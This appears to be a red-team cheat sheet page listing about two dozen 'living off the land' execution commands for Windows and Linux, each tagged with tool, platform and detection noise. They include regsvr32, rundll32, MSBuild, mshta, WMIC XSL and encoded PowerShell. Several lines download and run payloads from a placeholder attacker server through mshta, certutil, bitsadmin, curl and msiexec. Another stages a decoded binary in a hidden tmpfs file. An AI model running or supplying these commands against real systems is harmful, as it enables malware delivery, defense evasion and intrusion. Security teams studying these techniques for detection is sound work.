---
hide:
  - toc
---
# LOLBin & Local Execution

One-line execution primitives for payloads or scripts already available on the target.

<div class="ol-section-kicker"><span>RT</span><strong>Execution</strong></div>

## regsvr32 local scriptlet

```cmd
regsvr32.exe /s /u /i:payload.sct scrobj.dll
```

**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution · **Context:** User · **Noise:** Moderate

## rundll32 DLL export

```cmd
rundll32.exe payload.dll,EntryPoint
```

**Tool:** rundll32 · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## InstallUtil uninstall path

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

**Tool:** InstallUtil · **Platform:** Windows · **Tags:** .NET, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## MSBuild project execution

```cmd
MSBuild.exe payload.xml
```

**Tool:** MSBuild · **Platform:** Windows · **Tags:** MSBuild, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## ODBCConf DLL registration

```cmd
odbcconf.exe /S /A {REGSVR payload.dll}
```

**Tool:** odbcconf · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## Decode base64 to tmpfs

```bash
printf '%s' '<BASE64>' | base64 -d > /dev/shm/.p && chmod +x /dev/shm/.p
```

**Tool:** base64 · **Platform:** Linux · **Tags:** Decode, tmpfs, Staging · **Context:** User · **Noise:** Moderate

## Execute Python from stdin

```bash
python3 -c "exec(open('/dev/stdin').read())" < payload.py
```

**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Python, stdin, Execution · **Context:** User · **Noise:** Moderate


## mshta local HTA
```cmd
mshta.exe payload.hta
```
**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## mshta remote HTA
```cmd
mshta.exe https://<SERVER>/payload.hta
```
**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, Remote, LOLBin · **Context:** User · **Noise:** Moderate

## certutil download
```cmd
certutil.exe -urlcache -split -f https://<SERVER>/payload.exe payload.exe
```
**Tool:** certutil · **Platform:** Windows · **Tags:** Download, LOLBin · **Context:** User · **Noise:** Moderate

## bitsadmin transfer
```cmd
bitsadmin /transfer job /download /priority high https://<SERVER>/payload.exe C:\Windows\Tasks\payload.exe
```
**Tool:** bitsadmin · **Platform:** Windows · **Tags:** BITS, Download · **Context:** User · **Noise:** Moderate

## curl.exe download
```cmd
curl.exe -fsSL https://<SERVER>/payload.exe -o payload.exe
```
**Tool:** curl.exe · **Platform:** Windows · **Tags:** Download, Native · **Context:** User · **Noise:** Moderate

## msiexec remote package
```cmd
msiexec.exe /i https://<SERVER>/payload.msi /quiet
```
**Tool:** msiexec · **Platform:** Windows · **Tags:** MSI, LOLBin · **Context:** User · **Noise:** Moderate

## WMIC XSL processing
```cmd
wmic.exe os get /format:"https://<SERVER>/payload.xsl"
```
**Tool:** WMIC · **Platform:** Windows · **Tags:** XSL, LOLBin · **Context:** User · **Noise:** Moderate

## forfiles command invocation
```cmd
forfiles /p C:\Windows /m notepad.exe /c "cmd /c whoami"
```
**Tool:** forfiles · **Platform:** Windows · **Tags:** Proxy Execution, LOLBin · **Context:** User · **Noise:** Moderate

## pcalua process launch
```cmd
pcalua.exe -a cmd.exe -d C:\Windows\System32
```
**Tool:** pcalua · **Platform:** Windows · **Tags:** Proxy Execution, LOLBin · **Context:** User · **Noise:** Moderate

## SyncAppvPublishingServer PowerShell expression
```powershell
SyncAppvPublishingServer.exe "n; Start-Process cmd.exe"
```
**Tool:** SyncAppvPublishingServer · **Platform:** Windows · **Tags:** App-V, LOLBin · **Context:** User · **Noise:** Moderate



## PowerShell encoded command runner
```powershell
powershell.exe -NoProfile -EncodedCommand <BASE64_UTF16LE>
```
**Tool:** PowerShell · **Platform:** Windows · **Tags:** PowerShell, EncodedCommand, Execution · **Context:** User · **Noise:** Loud

## wscript local script
```cmd
wscript.exe payload.vbs
```
**Tool:** wscript · **Platform:** Windows · **Tags:** Script Host, VBS, Execution · **Context:** User · **Noise:** Moderate

## cscript local script
```cmd
cscript.exe //nologo payload.vbs
```
**Tool:** cscript · **Platform:** Windows · **Tags:** Script Host, VBS, Execution · **Context:** User · **Noise:** Moderate

## control.exe CPL launch
```cmd
control.exe payload.cpl
```
**Tool:** control.exe · **Platform:** Windows · **Tags:** CPL, Proxy Execution · **Context:** User · **Noise:** Moderate

## rundll32 CPL export
```cmd
rundll32.exe shell32.dll,Control_RunDLL payload.cpl
```
**Tool:** rundll32 · **Platform:** Windows · **Tags:** CPL, LOLBin, Execution · **Context:** User · **Noise:** Moderate

## PresentationHost file invocation
```cmd
PresentationHost.exe payload.xbap
```
**Tool:** PresentationHost · **Platform:** Windows · **Tags:** XBAP, LOLBin · **Context:** User · **Requires:** Component present · **Noise:** Moderate

## hh.exe local CHM
```cmd
hh.exe payload.chm
```
**Tool:** hh.exe · **Platform:** Windows · **Tags:** CHM, LOLBin · **Context:** User · **Noise:** Moderate

## explorer file launch
```cmd
explorer.exe C:\Path\payload.exe
```
**Tool:** explorer.exe · **Platform:** Windows · **Tags:** Shell, Execution · **Context:** User · **Noise:** Moderate


---

**Related:** [Overview](./) · [Lateral Movement](lateral-movement.md) · [Reverse Shells](reverse-shells.md)
